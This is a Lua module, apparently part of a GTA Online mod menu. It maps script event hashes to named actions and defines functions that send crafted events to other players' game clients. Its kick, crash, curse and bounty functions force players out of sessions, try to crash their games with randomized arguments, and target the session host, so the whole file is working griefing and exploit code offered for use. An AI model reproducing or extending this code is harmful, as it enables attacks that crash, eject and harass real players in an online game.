local scriptevents = {
    ['Netbail Kick'] = 0x493FC6BB, --requires script global 1
    ['Script Host Curse 1'] = 0x820DD3E4,
    ['Script Host Curse 2'] = 0x2A0520FE,
    ['Script Host Curse 3'] = 0xD11E424B,
    ['Passive Mode'] = 0x4267B065,
    ['CEO Kick'] = 0xED6F046,
    ['CEO Ban'] = 0xD26E4A01,
    ['CEO Money'] = 0x70AB59D5, --requires script global 1, pair
    ['Force To Mission'] = 0x786FBAAE,
    ['Force To Mission 2'] = 0xA517E3C8,
    ['Start CEO Mission'] = 0x1F1FFC3A,
    ['Start Warehouse Mission'] = 0xc7c4a641,
    ['Force To Island'] = 0xDAF8082C,
    ['Force To Island 2'] = 0x57420247,
    ['Casino Cutscene'] = 0x3FAC59CA,
    ['Transaction Error'] = 0x9A6CDD38, --requires script global 1, pair
    ['Camera Manipulation'] = 0x2FC154DC,
    ['Off The Radar'] = 0xE8A824A0, --requires script global 1
    ['Bribe Authorities'] = 0x66B0F59A, --requires script global 1
    ['Insurance Notification'] = 0x2FCF970F,
    ['Notification'] = 0x285DDF33,
    ['Typing Begin'] = 0x2C8A72D0,
    ['Typing Stop'] = 0xC4EF2D0B,
    ['Fake Invite'] = 0x43865AE4,
    ['Apartment Invite'] = 0x23F74138,
    ['Warehouse Invite'] = 0xE56661F6,
    ['Vehicle Kick'] = 0x2280A552,
    ['Vehicle EMP'] = 0x863B6494,
    ['Destroy Personal Vehicle'] = 0xC2CC7762,
    ['SMS'] = 0x717AB445,
    ['Bounty'] = 0x4D3010A8, --requires script global pair
    ['Remove Wanted'] = 0xFA8E0C52, --requires script global 1
}

function scriptevents.MainGlobal(Target)
    return script.get_global_i(1893551 + (1 + (Target * 599) + 510))
end

function scriptevents.CEOID(Target)
    return script.get_global_i(1893551 + (1 + (Target * 599)) + 10)
end

function scriptevents.IsPlayerAssociate(Target)
    return (script.get_global_i(1893551 + (1 + (Target * 599)) + 10) ~= -1 and script.get_global_i(1893551 + (1 + (Target * 599)) + 10) ~= Target)
end

function scriptevents.IsPlayerOTR(Target)
    return script.get_global_i(2689224 + (1 + (Target * 451)) + 207) == 1
end

function scriptevents.DoesPlayerHaveBounty(Target)
    return script.get_global_i(1835502 + (1 + (Target * 4)) + 3) == 1
end

function scriptevents.GetPersonalVehicle(Target)
    return script.get_global_i(2703660 + (173 + Target + 1))
end

function scriptevents.GlobalPair()
    return script.get_global_i(1921039 + 9), script.get_global_i(1921036 + 10)
end


function scriptevents.Send(Event, Params, Target)
    if not Target or not player.is_player_valid(Target) then
        return
    end

    if not tonumber(Event) then
        if scriptevents[Event] then
            Event = scriptevents[Event]
        else
            return
        end
    end

    script.trigger_script_event(Event, Target, Params)
end

function scriptevents.setBounty(Target, Amount, Anonymous)
    if not Target or not player.is_player_valid(Target) then
        return
    end

    for id = 0, 31 do
        if player.is_player_valid(id) then
            script.trigger_script_event(scriptevents['Bounty'], id, {player.player_id(), Target, 1, Amount or 10000, 0, Anonymous,  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, scriptevents.GlobalPair()})
        end
    end
end

local function random_args(ID, Amount, Min, Max)
    local args = {ID}
    if not Amount or Amount == 0 then
        return args
    end

    if not Min then
        Min = -2147483647
    end

    if not Max then
        Max = 2147483647
    end

    for i = 1, Amount do
        args[#args + 1] = math.random(Min, Max)
    end

    return args
end

local function Randomize(Table)
    for i = #Table, 2, -1 do
        local j = math.random(i)
        Table[i], Table[j] = Table[j], Table[i]
    end
    
    return Table
end

function scriptevents.kick(Target)
    if not Target or not player.is_player_valid(Target) then
        return
    end

    if script.get_host_of_this_script() == Target then
        script.trigger_script_event('Start CEO Mission', Target, {player.player_id(), 0, 4294967295})
    end

    script.trigger_script_event(scriptevents['Netbail Kick'], Target, {player.player_id(), scriptevents.MainGlobal(Target)})

    local args = random_args(player.player_id(), 25)
    args[5] = 115

    script.trigger_script_event(scriptevents['Apartment Invite'], Target, args)
end

function scriptevents.crash(Target)
    if not Target or not player.is_player_valid(Target) then
        return
    end

    script.trigger_script_event(0xAD63290E, Target, random_args(player.player_id(), 25))
    script.trigger_script_event(0x39624029, Target, random_args(player.player_id(), 25))
    script.trigger_script_event(0xE88ECD48, Target, random_args(player.player_id(), 25))
end

function scriptevents.curse(Version)
    local id = script.get_host_of_this_script()

    if id == player.player_id() then
        return
    end

    if player.is_player_valid(id) then
        script.trigger_script_event(scriptevents['Script Host Curse ' .. Version], id, random_args(player.player_id(), 25))
    end
end

return scriptevents